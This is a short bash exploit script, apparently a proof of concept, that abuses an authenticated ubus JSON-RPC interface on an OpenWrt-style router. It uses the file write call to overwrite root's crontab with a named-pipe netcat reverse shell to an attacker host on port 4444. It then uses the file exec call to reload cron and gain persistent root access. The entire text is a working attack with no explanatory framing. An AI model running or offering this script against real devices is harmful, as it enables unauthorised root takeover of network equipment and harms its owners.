#!/bin/bash
RHOST=192.168.56.2
RPORT=443
LHOST=192.168.56.1
LPORT=4444
CRONTAB=/etc/crontabs/root
SYSAUTH=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

echo "Overwriting root's crontab..."
curl -k 'https://'$RHOST':'$RPORT'/ubus' -X POST --data-raw '[{"jsonrpc":"2.0","id":3,"method":"call","params":["'$SYSAUTH'","file","write",{"path":"'$CRONTAB'","data":"* * * * * rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc '$LHOST' '$LPORT' >/tmp/f\n","mode":420}]}]' > /dev/null 2>&1
echo "Forcing reload..."
curl -k 'https://'$RHOST':'$RPORT'/ubus' -X POST --data-raw '[{"jsonrpc":"2.0","id":3,"method":"call","params":["'$SYSAUTH'","file","exec",{"command":"/etc/init.d/cron","params":["reload"],"env":null}]}]' > /dev/null 2>&1
